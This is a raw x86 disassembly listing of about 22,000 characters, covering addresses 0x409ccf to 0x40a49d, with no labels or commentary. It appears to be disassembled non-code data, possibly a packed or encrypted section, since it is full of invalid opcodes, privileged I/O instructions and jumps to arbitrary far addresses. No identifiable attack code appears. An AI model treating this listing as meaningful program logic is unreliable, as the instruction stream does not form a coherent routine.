  409ccf:	sub    bl,BYTE PTR [edx]
  409cd1:	nop
  409cd2:	je     0x409cf7
  409cd4:	gs xchg ebp,eax
  409cd6:	sbb    esi,edi
  409cd8:	stc    
  409cd9:	jo     0x409cf1
  409cdb:	leave  
  409cdc:	ror    DWORD PTR fs:[edx-0x1a],0xb4
  409ce1:	ror    DWORD PTR [eax-0x48],cl
  409ce4:	cld    
  409ce5:	sub    edx,edx
  409ce7:	repz int3 
  409ce9:	test   BYTE PTR [eax],dh
  409ceb:	rcr    BYTE PTR [ecx-0x34],0xe9
  409cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cf0:	mov    ebx,0x766e52b8
  409cf5:	sub    edx,DWORD PTR [ecx+0x22]
  409cf8:	inc    ebp
  409cf9:	hlt    
  409cfa:	inc    esp
  409cfb:	adc    bh,BYTE PTR [edi]
  409cfd:	call   0xffd7:0x33ad5fb5
  409d04:	adc    BYTE PTR [esi],ah
  409d06:	inc    esp
  409d07:	mul    DWORD PTR ds:0x4cffad6c
  409d0d:	jo     0x409d09
  409d0f:	xchg   BYTE PTR [esi-0x43b1c211],bh
  409d15:	add    al,0x57
  409d17:	sbb    BYTE PTR [esi-0x32],dl
  409d1a:	xchg   ebx,eax
  409d1b:	jle    0x409cbc
  409d1d:	sbb    esp,DWORD PTR [edi]
  409d1f:	(bad)  
  409d20:	aad    0x1
  409d22:	inc    ebp
  409d23:	mov    eax,es
  409d25:	imul   esp,DWORD PTR [ebx+0x34112a63],0x182bd505
  409d2f:	mov    edx,0x63aa95ce
  409d34:	sti    
  409d35:	mov    ebx,0x2949e99
  409d3a:	retf   0x4e2f
  409d3d:	idiv   eax
  409d3f:	adc    al,0xbd
  409d41:	and    DWORD PTR [esi-0x6e],edi
  409d44:	ja     0x409d6c
  409d46:	sub    ah,0x18
  409d49:	mov    eax,0xaade3eb2
  409d4e:	xor    al,0x6b
  409d50:	sub    edx,edi
  409d52:	mov    eax,0xc5422bab
  409d57:	lds    edx,FWORD PTR [ebp+0xb]
  409d5a:	int    0x94
  409d5c:	call   0x4f8d:0xae028f23
  409d63:	imul   ebp,DWORD PTR [ebx+0x7a8b99a],0xffffffa5
  409d6a:	(bad)  
  409d6b:	jo     0x409d43
  409d6d:	ss repz push 0xfffffffc
  409d71:	mov    al,ds:0x259acc36
  409d76:	add    esi,DWORD PTR [esi]
  409d78:	sub    eax,esi
  409d7a:	push   ebp
  409d7b:	mov    bh,0x79
  409d7d:	mov    al,0x2d
  409d7f:	gs (bad) 
  409d81:	jmp    0xc3bc:0xae52f86d
  409d88:	and    dl,bl
  409d8a:	mov    edx,DWORD PTR [ecx-0x60]
  409d8d:	sub    esp,DWORD PTR [edx-0x360661fd]
  409d93:	inc    ecx
  409d94:	mov    fs,ebx
  409d96:	jle    0x409d92
  409d98:	mov    cl,0x9c
  409d9a:	ja     0x409d73
  409d9c:	ja     0x409dee
  409d9e:	(bad)  
  409d9f:	out    0xb1,al
  409da1:	dec    esi
  409da2:	xchg   BYTE PTR [ebp-0x5e38e559],bh
  409da8:	inc    edi
  409da9:	in     eax,0xc7
  409dab:	and    esi,esp
  409dad:	push   ebp
  409dae:	dec    ebx
  409daf:	in     eax,dx
  409db0:	nop
  409db1:	or     BYTE PTR [edx-0x448f295],ah
  409db7:	loopne 0x409dae
  409db9:	or     al,0xdd
  409dbb:	pop    ss
  409dbc:	mov    WORD PTR [ecx],ds
  409dbe:	jge    0x409d42
  409dc0:	sbb    edx,edx
  409dc2:	cld    
  409dc3:	dec    esp
  409dc4:	xlat   BYTE PTR ds:[ebx]
  409dc5:	iret   
  409dc6:	aaa    
  409dc7:	sbb    BYTE PTR [edi+eiz*1],0xe
  409dcb:	push   0xefe65f40
  409dd0:	adc    edx,DWORD PTR [eax+0x38f5817a]
  409dd6:	push   cs
  409dd7:	sub    esp,esp
  409dd9:	adc    BYTE PTR [eax],dl
  409ddb:	pop    ebp
  409ddc:	cwde   
  409ddd:	mov    edi,0xb8e7cc66
  409de2:	outs   dx,BYTE PTR ds:[esi]
  409de3:	sub    al,0xe0
  409de5:	dec    esi
  409de6:	adc    al,0xbc
  409de8:	push   ecx
  409de9:	sub    BYTE PTR [ecx+0x46],bl
  409dec:	aaa    
  409ded:	add    esi,DWORD PTR [eax-0x6b]
  409df0:	rcr    DWORD PTR [eax],cl
  409df2:	repz sahf 
  409df4:	mov    cl,0x94
  409df6:	(bad)  
  409df7:	mov    dh,0xd7
  409df9:	stos   DWORD PTR es:[edi],eax
  409dfa:	fcmovu st,st(5)
  409dfc:	jp     0x409df4
  409dfe:	mov    ds:0x8d537638,eax
  409e03:	cdq    
  409e04:	mov    ds:0x98715792,al
  409e09:	in     al,dx
  409e0a:	loopne 0x409d8d
  409e0c:	push   edi
  409e0d:	mov    ch,0xd8
  409e0f:	call   0x8dbc602d
  409e14:	cmp    cl,ch
  409e16:	shr    ecx,1
  409e18:	sbb    esp,DWORD PTR [ebp-0x2f]
  409e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e1c:	test   eax,0x48255e5d
  409e21:	adc    al,0x2c
  409e23:	rcr    dh,1
  409e25:	das    
  409e26:	mov    edx,0xb8dc112c
  409e2b:	mov    DWORD PTR [edi-0x4128ebe5],edi
  409e31:	mov    esp,0x6e4ff40a
  409e36:	std    
  409e37:	adc    bh,bh
  409e39:	push   esi
  409e3a:	pop    ebp
  409e3b:	nop
  409e3c:	or     ecx,eax
  409e3e:	xor    BYTE PTR [ecx-0x4561e36a],dh
  409e44:	sub    ah,BYTE PTR [esi+0x283838d1]
  409e4a:	mov    ebx,0x1da0db7c
  409e4f:	stc    
  409e50:	lods   eax,DWORD PTR ds:[esi]
  409e51:	add    ebx,esp
  409e53:	sti    
  409e54:	dec    ebx
  409e55:	daa    
  409e56:	push   0x1c
  409e58:	scas   eax,DWORD PTR es:[edi]
  409e59:	data16 jae 0x409e27
  409e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e5d:	add    edx,DWORD PTR [ecx+0x73]
  409e60:	pusha  
  409e61:	adc    eax,0x590ad6e
  409e66:	cmp    cl,bh
  409e68:	mov    ebx,0x47038014
  409e6d:	push   eax
  409e6e:	nop
  409e6f:	dec    esi
  409e70:	and    BYTE PTR [edx],dl
  409e72:	push   esp
  409e73:	push   edi
  409e74:	lock sahf 
  409e76:	push   ecx
  409e77:	or     BYTE PTR [ecx+eiz*8-0x16514cc9],0xe7
  409e7f:	jge    0x409e21
  409e81:	loope  0x409e89
  409e83:	dec    ebx
  409e84:	fadd   DWORD PTR ds:0x9d96b594
  409e8a:	lea    edx,[esi+edx*8-0x335978dd]
  409e91:	hlt    
  409e92:	ja     0x409e58
  409e94:	xchg   ebx,eax
  409e95:	dec    edx
  409e96:	xchg   esi,eax
  409e97:	(bad)  
  409e98:	mov    ebx,0xd8c9c800
  409e9d:	cwde   
  409e9e:	pop    ebp
  409e9f:	sbb    eax,0xc7e8c639
  409ea4:	fxch   st(0)
  409ea6:	inc    esp
  409ea7:	lock arpl WORD PTR [ebp-0x44204b2f],dx
  409eae:	mov    ds,WORD PTR [eiz*8-0x67aa98e2]
  409eb5:	inc    edi
  409eb6:	(bad)  
  409eb7:	retf   0x8544
  409eba:	xchg   edi,eax
  409ebb:	inc    esi
  409ebc:	cli    
  409ebd:	fidiv  WORD PTR [edx+0x57]
  409ec0:	loope  0x409ea3
  409ec2:	xor    al,0x8f
  409ec4:	jno    0x409f35
  409ec6:	jne    0x409ea7
  409ec8:	std    
  409ec9:	xchg   DWORD PTR [ebx+ebx*4-0x3],ebx
  409ecd:	ret    
  409ece:	jo     0x409f31
  409ed0:	call   0x25813bb3
  409ed5:	call   0x65b9:0xf8442731
  409edc:	stos   DWORD PTR es:[edi],eax
  409edd:	push   ds
  409ede:	push   edx
  409edf:	(bad)  
  409ee1:	stos   DWORD PTR es:[edi],eax
  409ee2:	jecxz  0x409ed3
  409ee4:	popf   
  409ee5:	xchg   esi,eax
  409ee6:	ja     0x409ec2
  409ee8:	adc    BYTE PTR [esi-0x41692b41],cl
  409eee:	xchg   edx,eax
  409eef:	xchg   esp,eax
  409ef0:	jno    0x409eb3
  409ef2:	icebp  
  409ef3:	pop    es
  409ef4:	fcomip st,st(5)
  409ef6:	mov    dh,0xe6
  409ef8:	dec    ebp
  409ef9:	mov    ch,BYTE PTR [eax+0x6e]
  409efc:	mov    cl,0x5a
  409efe:	hlt    
  409eff:	mov    eax,ds:0x774b075e
  409f04:	or     DWORD PTR [eax+0x2],0x72
  409f08:	fidivr WORD PTR [ecx-0x32]
  409f0b:	or     DWORD PTR [ebp+0x4a],ebp
  409f0e:	aam    0xe9
  409f10:	xchg   edi,eax
  409f11:	sbb    DWORD PTR ds:0xb8ffd451,esp
  409f17:	jle    0x409eec
  409f19:	cmc    
  409f1a:	addr16 inc ebx
  409f1c:	iret   
  409f1d:	cld    
  409f1e:	cwde   
  409f1f:	lods   al,BYTE PTR ds:[esi]
  409f20:	mov    WORD PTR [edx-0x31e6a0b7],ss
  409f26:	dec    edx
  409f27:	xor    DWORD PTR [ebx],ebp
  409f29:	jp     0x409f33
  409f2b:	test   eax,0xd493591d
  409f30:	mov    ebp,0xdbc371c0
  409f35:	xchg   BYTE PTR [edi-0x22e0ceee],dh
  409f3b:	jbe    0x409f78
  409f3d:	data16 and al,0x79
  409f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f41:	mov    DWORD PTR [eax-0xeb88e0e],eax
  409f47:	rol    bh,1
  409f49:	or     eax,0xafbb800a
  409f4e:	js     0x409f8f
  409f50:	mov    cl,0x87
  409f52:	(bad)  
  409f53:	mov    ecx,0x42316858
  409f58:	stos   BYTE PTR es:[edi],al
  409f59:	sub    eax,0x4fa7e9e0
  409f5e:	xor    eax,esp
  409f60:	sub    cl,BYTE PTR [eax-0x4c]
  409f63:	into   
  409f64:	aad    0xde
  409f66:	sbb    DWORD PTR [ecx+0x5e],ecx
  409f69:	mov    eax,0xf2e73308
  409f6e:	inc    esi
  409f6f:	mov    al,ds:0x6549862c
  409f74:	repz adc eax,0x7e63caab
  409f7a:	(bad)  
  409f7b:	cmp    ebx,DWORD PTR [ebp-0x21c8f904]
  409f81:	mov    esi,0x9e46a2be
  409f86:	dec    eax
  409f87:	or     DWORD PTR [edi+0x62d453cc],ebp
  409f8d:	lds    edi,FWORD PTR [edi+ecx*1-0x12e36369]
  409f94:	sbb    DWORD PTR [edx],esi
  409f96:	mov    BYTE PTR [eax-0x7f67381e],cl
  409f9c:	jmp    0x409fda
  409f9e:	xchg   edi,eax
  409f9f:	adc    esp,esp
  409fa1:	xlat   BYTE PTR ds:[ebx]
  409fa2:	xor    bl,BYTE PTR [eax+eiz*8-0x7abacd0]
  409fa9:	sbb    eax,0xcbd1b414
  409fae:	xchg   esp,eax
  409faf:	pusha  
  409fb0:	pop    esp
  409fb1:	mov    al,ds:0x625fad2d
  409fb6:	add    DWORD PTR [ebx-0x31f00bd0],eax
  409fbc:	or     esi,DWORD PTR [ebx+0x6fe45c4a]
  409fc2:	ret    0x2bf
  409fc5:	adc    dl,cl
  409fc7:	and    edx,DWORD PTR [ebx]
  409fc9:	jmp    0x67d6:0x2dda4d29
  409fd0:	out    0xbb,al
  409fd2:	dec    esp
  409fd3:	fnstenv [edx-0x2ac21340]
  409fd9:	sar    BYTE PTR [ebx-0x73],0xbd
  409fdd:	add    DWORD PTR ds:0x99d55b0f,ebx
  409fe3:	pop    ds
  409fe4:	arpl   WORD PTR [eax-0x3e493e0f],sp
  409fea:	fadd   QWORD PTR [eax+0x54f2e6fa]
  409ff0:	mov    ds:0x48468455,al
  409ff5:	shr    esi,cl
  409ff7:	mov    ch,0xaa
  409ff9:	sub    DWORD PTR [ecx+ebx*8],esp
  409ffc:	rol    BYTE PTR [ebx+0x34],0xf
  40a000:	mov    BYTE PTR [edi],ah
  40a002:	iret   
  40a003:	xor    al,0xd5
  40a005:	sub    eax,0x5ac04045
  40a00a:	sar    BYTE PTR [edx-0x658fe563],cl
  40a010:	jne    0x40a042
  40a012:	and    DWORD PTR [edx+0x37],esi
  40a015:	mov    cl,0xab
  40a017:	lahf   
  40a018:	xor    eax,0xa24d516f
  40a01d:	xor    ebx,ebp
  40a01f:	jae    0x409fbc
  40a021:	fidivr DWORD PTR [edx+0x449cc6e]
  40a027:	(bad)  
  40a028:	cld    
  40a029:	shr    BYTE PTR [ebx-0x7eaa58dc],cl
  40a02f:	mov    bh,0xc5
  40a031:	add    al,0x5a
  40a033:	xor    DWORD PTR [ebp+0x6984c8c9],0x17
  40a03a:	xchg   edx,eax
  40a03b:	gs jno 0x40a0a0
  40a03e:	call   0x5fe9:0xdc15600f
  40a045:	fnstsw WORD PTR [edx]
  40a047:	sub    eax,0x65acf5aa
  40a04c:	xchg   esi,eax
  40a04d:	sub    DWORD PTR [edi],0xffffffeb
  40a050:	xor    DWORD PTR [esi+0x44],0x1312fa9b
  40a057:	mov    dh,0x6e
  40a059:	mov    bl,0xb3
  40a05b:	pop    ebp
  40a05c:	out    0x3a,eax
  40a05e:	lds    eax,FWORD PTR ds:0x8de1bd69
  40a064:	(bad)  
  40a065:	loope  0x40a0ce
  40a067:	pop    esi
  40a068:	jmp    0x2624:0x5b29b719
  40a06f:	outs   dx,DWORD PTR ds:[esi]
  40a070:	je     0x40a0c6
  40a072:	cmp    DWORD PTR [ebp+0x7d],edi
  40a075:	sub    ebx,DWORD PTR [eax]
  40a077:	stos   DWORD PTR es:[edi],eax
  40a078:	dec    eax
  40a079:	ret    
  40a07a:	mov    ebx,0x8dcb1df5
  40a07f:	outs   dx,BYTE PTR ds:[esi]
  40a080:	or     ecx,esi
  40a082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a083:	cmp    DWORD PTR [ebp-0x507e66ec],0xffffffb1
  40a08a:	push   edx
  40a08b:	add    al,BYTE PTR [esi+ebp*8-0x36a5ed00]
  40a092:	int    0x5
  40a094:	cld    
  40a095:	push   0x655f962a
  40a09a:	and    dh,BYTE PTR [ebp-0x65]
  40a09d:	sbb    al,0x6d
  40a09f:	inc    edx
  40a0a0:	in     al,dx
  40a0a1:	jg     0x40a067
  40a0a3:	dec    edx
  40a0a4:	sub    DWORD PTR [edx],eax
  40a0a6:	jmp    FWORD PTR [ecx+0x5a8edcda]
  40a0ac:	ds lock mov dl,0x2f
  40a0b0:	mov    ds:0xffe0de76,al
  40a0b5:	pop    ebp
  40a0b6:	and    al,0x2b
  40a0b8:	out    dx,eax
  40a0b9:	gs ror BYTE PTR cs:[edx+0x6b76752],1
  40a0c1:	imul   edi,DWORD PTR [esp+ebp*4+0x4c],0x12
  40a0c6:	pusha  
  40a0c7:	cwde   
  40a0c8:	sbb    eax,0x4c88fe27
  40a0cd:	dec    ebp
  40a0ce:	lods   al,BYTE PTR ds:[esi]
  40a0cf:	pop    ebx
  40a0d0:	call   0x1712:0xa5137d86
  40a0d7:	xchg   edi,eax
  40a0d8:	mov    bh,0x78
  40a0da:	mov    al,ds:0xc0f656db
  40a0df:	add    BYTE PTR [esi-0x4d7c0def],bh
  40a0e5:	mov    BYTE PTR [edx-0x1df16702],0x37
  40a0ec:	cs push 0x6b1e3fd3
  40a0f2:	jne    0x40a0df
  40a0f4:	repz xlat BYTE PTR ds:[ebx]
  40a0f6:	cmp    DWORD PTR [eax],esi
  40a0f8:	or     eax,0x4b0bd787
  40a0fd:	dec    esp
  40a0fe:	push   ds
  40a0ff:	jno    0x40a0c4
  40a101:	in     eax,0x87
  40a103:	or     ah,BYTE PTR fs:[ecx-0x53]
  40a107:	push   ss
  40a108:	pop    ss
  40a109:	or     BYTE PTR [esi],bh
  40a10b:	data16 and BYTE PTR [edx+eax*8-0x6e2d0eb0],bl
  40a113:	jmp    0x474a0690
  40a118:	mov    dh,0x42
  40a11a:	enter  0x6980,0x82
  40a11e:	jge    0x40a0a6
  40a120:	clc    
  40a121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a122:	cmc    
  40a123:	out    0xe5,eax
  40a125:	mov    ebx,DWORD PTR [edi+0x4a]
  40a128:	push   ss
  40a129:	iret   
  40a12a:	stos   DWORD PTR es:[edi],eax
  40a12b:	sub    dh,ch
  40a12d:	adc    eax,0xba9256be
  40a132:	xor    eax,0xb3cfe387
  40a137:	lods   al,BYTE PTR ds:[esi]
  40a138:	(bad)  
  40a139:	mov    ecx,0x814506ed
  40a13e:	push   ds
  40a13f:	cmp    DWORD PTR [ebp-0x80],esi
  40a142:	in     eax,0x18
  40a144:	push   ecx
  40a145:	or     esp,DWORD PTR [ebx-0x284ca86f]
  40a14b:	loop   0x40a183
  40a14d:	mov    cl,0xd3
  40a14f:	js     0x40a191
  40a151:	shr    DWORD PTR [ecx+0x10],cl
  40a154:	js     0x40a11b
  40a156:	leave  
  40a157:	stos   BYTE PTR es:[edi],al
  40a158:	pushf  
  40a159:	add    BYTE PTR [ecx+0x6a484b36],0xa6
  40a160:	in     al,dx
  40a161:	mov    esi,0x28fe8411
  40a166:	mov    bh,0xa3
  40a168:	jmp    DWORD PTR [edi-0x3fce4cc]
  40a16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a16f:	fidivr DWORD PTR es:0xc64e09bd
  40a176:	mov    ebx,0x7acf5a2b
  40a17b:	sub    ah,BYTE PTR [ecx]
  40a17d:	xchg   esi,eax
  40a17e:	sub    al,0x4c
  40a180:	mov    esi,0x41e591c4
  40a185:	or     BYTE PTR [eax+0x2c50ded7],dh
  40a18b:	xchg   esp,eax
  40a18c:	mov    ebx,0x6ff1ea5a
  40a191:	pop    esp
  40a192:	inc    esp
  40a193:	icebp  
  40a194:	or     ch,BYTE PTR [edi+0x5b]
  40a197:	cdq    
  40a198:	ss adc eax,0x635dd6dc
  40a19e:	adc    BYTE PTR [ebp+0xd7c5b33],cl
  40a1a4:	push   esp
  40a1a5:	mov    dh,0x9d
  40a1a7:	mov    dh,0xc3
  40a1a9:	icebp  
  40a1aa:	pop    ebp
  40a1ab:	sbb    eax,DWORD PTR [esi+edx*4+0x2100ecf1]
  40a1b2:	mov    esi,0x51822b11
  40a1b7:	out    dx,al
  40a1b8:	das    
  40a1b9:	test   eax,0xdd9957f2
  40a1be:	xchg   edi,eax
  40a1bf:	shr    ah,cl
  40a1c1:	aaa    
  40a1c2:	es mov ebx,0x23e72ca
  40a1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1c9:	cmp    al,0xa7
  40a1cb:	push   edx
  40a1cc:	push   0x4fd6167b
  40a1d1:	loop   0x40a1bd
  40a1d3:	adc    edi,DWORD PTR [edi+esi*2+0xe174924]
  40a1da:	(bad)  
  40a1db:	dec    esi
  40a1dc:	(bad)  
  40a1dd:	mov    ebp,0x75331b8e
  40a1e2:	dec    edx
  40a1e3:	call   0xc25f5a05
  40a1e8:	imul   eax,DWORD PTR [ebx+edx*1],0xd2abdede
  40a1ef:	push   0xbb998f17
  40a1f4:	test   BYTE PTR [ebp-0x51],dl
  40a1f7:	mov    dl,0x8d
  40a1f9:	dec    eax
  40a1fa:	xchg   ecx,eax
  40a1fb:	jae    0x40a1f6
  40a1fd:	(bad)  
  40a1ff:	arpl   WORD PTR [edi],si
  40a201:	xchg   esi,eax
  40a202:	adc    BYTE PTR [eax],dh
  40a204:	or     dl,BYTE PTR [edx-0x6a]
  40a207:	add    DWORD PTR ds:[ebp+0x1601a306],0xffffffde
  40a20f:	mov    edx,0x16076f63
  40a214:	mov    ecx,DWORD PTR [eax]
  40a216:	xchg   ebx,eax
  40a217:	xor    al,0xe5
  40a219:	xor    eax,DWORD PTR [eax-0x4a]
  40a21c:	ret    0x2532
  40a21f:	test   al,0xf7
  40a221:	dec    ebp
  40a222:	fiadd  WORD PTR [ecx]
  40a224:	popfw  
  40a226:	add    eax,0x4f0c0635
  40a22b:	call   0x5eff:0xf9bffeb8
  40a232:	fcmovnb st,st(0)
  40a234:	(bad)  
  40a235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a236:	cmp    dh,bh
  40a238:	mov    edx,0x1598204d
  40a23d:	mov    edx,DWORD PTR [ebx-0xd89cedb]
  40a243:	popa   
  40a244:	jno    0x40a1dd
  40a246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a247:	push   edx
  40a248:	inc    edx
  40a249:	push   esi
  40a24a:	int3   
  40a24b:	xor    al,0x66
  40a24d:	in     al,0x54
  40a24f:	pop    edi
  40a250:	adc    DWORD PTR [ecx+0x5],esp
  40a253:	inc    esi
  40a254:	inc    ebp
  40a255:	cmp    BYTE PTR [ebx+esi*2],bl
  40a258:	pop    edi
  40a259:	xlat   BYTE PTR ds:[ebx]
  40a25a:	scas   al,BYTE PTR es:[edi]
  40a25b:	mov    ds:0x506ddcd,al
  40a260:	dec    esi
  40a261:	sar    DWORD PTR [ebp-0x288b64f5],0x80
  40a268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a269:	addr16 push edi
  40a26b:	jecxz  0x40a298
  40a26d:	enter  0x1f88,0xc4
  40a271:	dec    esp
  40a272:	or     ah,BYTE PTR [ebx]
  40a274:	stos   DWORD PTR es:[edi],eax
  40a275:	aad    0xea
  40a277:	xchg   ecx,eax
  40a278:	popf   
  40a279:	or     al,dl
  40a27b:	scas   al,BYTE PTR es:[edi]
  40a27c:	push   ebx
  40a27d:	outs   dx,BYTE PTR ds:[esi]
  40a27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a27f:	jne    0x40a2c9
  40a281:	add    eax,0x93201d35
  40a286:	leave  
  40a287:	into   
  40a288:	pop    ecx
  40a289:	pop    esi
  40a28a:	inc    ebp
  40a28b:	lods   al,BYTE PTR ds:[esi]
  40a28c:	cld    
  40a28d:	and    ebp,0x55ef283d
  40a293:	mov    bl,0x6
  40a295:	mov    esp,0x8678718b
  40a29a:	out    0x6,eax
  40a29c:	int    0x3e
  40a29e:	mov    edx,0x7a4adaa9
  40a2a3:	rcl    BYTE PTR [edi],0x21
  40a2a6:	fimul  WORD PTR [eax+edx*8]
  40a2a9:	xor    edx,DWORD PTR [ecx-0x70c8dbdc]
  40a2af:	test   DWORD PTR [ebx+0x4b33e82f],edx
  40a2b5:	or     al,0xcd
  40a2b7:	hlt    
  40a2b8:	mov    BYTE PTR ds:0x59589dbe,cl
  40a2be:	mov    bh,0x97
  40a2c0:	lods   eax,DWORD PTR ds:[esi]
  40a2c1:	mov    cl,0xe6
  40a2c3:	add    esi,DWORD PTR [edx]
  40a2c5:	push   0x4563638
  40a2ca:	push   edx
  40a2cb:	lock fcomp QWORD PTR [ecx-0x3e5ad715]
  40a2d2:	xchg   ecx,eax
  40a2d3:	mov    bl,0x6
  40a2d5:	push   ecx
  40a2d6:	pop    edi
  40a2d7:	outs   dx,BYTE PTR ds:[esi]
  40a2d8:	call   0xe98f:0xa914607d
  40a2df:	out    0xfa,eax
  40a2e1:	aas    
  40a2e2:	and    ebx,ebx
  40a2e4:	xchg   edi,eax
  40a2e5:	and    DWORD PTR [ebp+0x13969a29],esp
  40a2eb:	xor    BYTE PTR [ebp+0x68778574],dh
  40a2f1:	or     al,0xb3
  40a2f3:	out    0xbc,eax
  40a2f5:	xchg   esp,eax
  40a2f6:	call   0x2b41bb3d
  40a2fb:	dec    ebx
  40a2fc:	cmp    eax,0x3d6c9c92
  40a301:	adc    al,ah
  40a303:	aas    
  40a304:	popf   
  40a305:	xor    DWORD PTR [eax-0x7f],eax
  40a308:	jmp    0x40a2f7
  40a30a:	push   ecx
  40a30b:	jmp    0x40a317
  40a30d:	sahf   
  40a30e:	out    dx,al
  40a30f:	ss push edx
  40a311:	test   DWORD PTR [edx+edi*1],eax
  40a314:	adc    ah,BYTE PTR [ebp+esi*1-0x10e980ab]
  40a31b:	in     eax,dx
  40a31c:	loop   0x40a2d1
  40a31e:	jno    0x40a353
  40a320:	test   al,0x7
  40a322:	cli    
  40a323:	add    BYTE PTR [edx+0x2b],ah
  40a326:	mov    esp,0xdcef661
  40a32b:	mov    ebx,0xf030ca1
  40a330:	scas   al,BYTE PTR es:[edi]
  40a331:	inc    DWORD PTR ds:0xaf599e2b
  40a337:	jmp    0xc104:0x770cc961
  40a33e:	sbb    DWORD PTR [edi],ebp
  40a340:	loopne 0x40a306
  40a342:	push   cs
  40a343:	mov    bl,0x2
  40a345:	adc    ch,BYTE PTR [edi+0x79]
  40a348:	mov    dh,0x15
  40a34a:	outs   dx,BYTE PTR ds:[esi]
  40a34b:	mov    ds:0x5f70ead5,al
  40a350:	loop   0x40a38e
  40a352:	mov    al,ds:0x6f3165c1
  40a357:	inc    ebx
  40a358:	inc    edi
  40a359:	and    bh,cl
  40a35b:	jb     0x40a311
  40a35d:	lods   eax,DWORD PTR ds:[esi]
  40a35e:	dec    esp
  40a35f:	jg     0x40a334
  40a361:	add    al,0x6c
  40a363:	cli    
  40a364:	inc    ecx
  40a365:	gs xchg esi,eax
  40a367:	in     eax,dx
  40a368:	sub    dh,dh
  40a36a:	xor    BYTE PTR [ebx],bl
  40a36c:	mov    dl,0x57
  40a36e:	inc    eax
  40a36f:	je     0x40a376
  40a371:	sar    DWORD PTR [eax+0x6fa68dc2],cl
  40a377:	xor    cl,cl
  40a379:	enter  0x7878,0x35
  40a37d:	call   0x5d15:0x7823b108
  40a384:	icebp  
  40a385:	sti    
  40a386:	daa    
  40a387:	(bad)  
  40a388:	mov    ds:0x827307f2,al
  40a38d:	lods   eax,DWORD PTR ds:[esi]
  40a38e:	mov    ah,0xe6
  40a390:	mov    edx,0xa55bee09
  40a395:	call   0x99df:0x742ffd7d
  40a39c:	dec    esp
  40a39d:	pop    edi
  40a39e:	adc    al,0xf4
  40a3a0:	ret    0xe875
  40a3a3:	inc    edx
  40a3a4:	inc    ecx
  40a3a5:	xchg   ebp,eax
  40a3a6:	adc    edi,DWORD PTR [ebx+0x71]
  40a3a9:	jle    0x40a387
  40a3ab:	fstp   TBYTE PTR [ebx]
  40a3ad:	pop    es
  40a3ae:	mov    ds,WORD PTR [ebx-0x5abc818]
  40a3b4:	sub    esi,DWORD PTR [ebp-0x624df157]
  40a3ba:	jl     0x40a3bc
  40a3bc:	or     al,ah
  40a3be:	inc    edi
  40a3bf:	int3   
  40a3c0:	aaa    
  40a3c1:	mov    eax,ds:0x1f943da4
  40a3c6:	(bad)  
  40a3c7:	loope  0x40a399
  40a3c9:	jg     0x40a3a7
  40a3cb:	pop    esi
  40a3cc:	xchg   edi,eax
  40a3cd:	int3   
  40a3ce:	loop   0x40a420
  40a3d0:	in     al,0xff
  40a3d2:	scas   eax,DWORD PTR es:[edi]
  40a3d3:	mov    ch,0xb7
  40a3d5:	nop
  40a3d6:	cmp    eax,0x915b02f8
  40a3db:	jmp    0x513765c0
  40a3e0:	xchg   esi,eax
  40a3e1:	push   ebx
  40a3e2:	mov    eax,0xdbfe7486
  40a3e7:	dec    esp
  40a3e8:	mov    ebp,0x72db8cbd
  40a3ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3ee:	or     BYTE PTR [edi+esi*1],bh
  40a3f1:	fild   WORD PTR [eax-0x44]
  40a3f4:	jp     0x40a41a
  40a3f6:	scas   eax,DWORD PTR es:[edi]
  40a3f7:	call   0x6f16:0xdb66f0c6
  40a3fe:	sbb    eax,0x5936029f
  40a403:	xor    DWORD PTR [ecx+0x7b],ebp
  40a406:	fldenv [edi+0x52]
  40a409:	jo     0x40a38d
  40a40b:	and    DWORD PTR [edi-0xc],eax
  40a40e:	mov    ebx,0x663a16bf
  40a413:	push   ecx
  40a414:	scas   al,BYTE PTR es:[edi]
  40a415:	loopne 0x40a447
  40a417:	in     al,0x1c
  40a419:	push   edi
  40a41a:	jno    0x40a3fd
  40a41c:	or     BYTE PTR [eax+0xb],bl
  40a41f:	add    eax,0x6f55d778
  40a424:	push   cs
  40a425:	lea    eax,[esi-0x43]
  40a428:	vmread ebx,edi
  40a42b:	jbe    0x40a4a0
  40a42d:	jmp    0x40a3fc
  40a42f:	js     0x40a3c9
  40a431:	dec    edi
  40a432:	out    0xab,al
  40a434:	or     DWORD PTR [edx-0x7b69dec8],ebp
  40a43a:	sbb    dl,BYTE PTR [eax+0x48a58251]
  40a440:	in     al,0x93
  40a442:	lods   eax,DWORD PTR ds:[esi]
  40a443:	std    
  40a444:	mov    dh,0xe9
  40a446:	ror    DWORD PTR [esi],0x51
  40a449:	push   edx
  40a44a:	mov    edi,ecx
  40a44c:	push   esi
  40a44d:	dec    edx
  40a44e:	xchg   edi,eax
  40a44f:	mov    eax,ds:0x7fe9fa26
  40a454:	fnstcw WORD PTR [eax-0x773ba329]
  40a45a:	jnp    0x40a44f
  40a45c:	ja     0x40a447
  40a45e:	cmp    BYTE PTR [eax+0x39],dh
  40a461:	sub    al,0x33
  40a463:	bound  ebx,QWORD PTR [edx-0x7a7a5b6d]
  40a469:	nop
  40a46a:	and    bh,ch
  40a46c:	std    
  40a46d:	pop    eax
  40a46e:	add    eax,DWORD PTR [edx-0x4d71225b]
  40a474:	mov    edx,0x51988ce0
  40a479:	test   eax,0x72b09839
  40a47e:	das    
  40a47f:	jl     0x40a494
  40a481:	add    DWORD PTR [edi-0x14dd1ee5],ebx
  40a487:	sbb    ecx,DWORD PTR [edi-0x51536a23]
  40a48d:	nop
  40a48e:	ds dec edi
  40a490:	fisubr WORD PTR [eax-0x55]
  40a493:	lea    edi,[edi]
  40a495:	lods   eax,DWORD PTR ds:[esi]
  40a496:	add    esi,DWORD PTR [edi+0x256be509]
  40a49c:	scas   eax,DWORD PTR es:[edi]
  40a49d:	mov    DWORD PTR [esi-0x7e65eddd],ebp
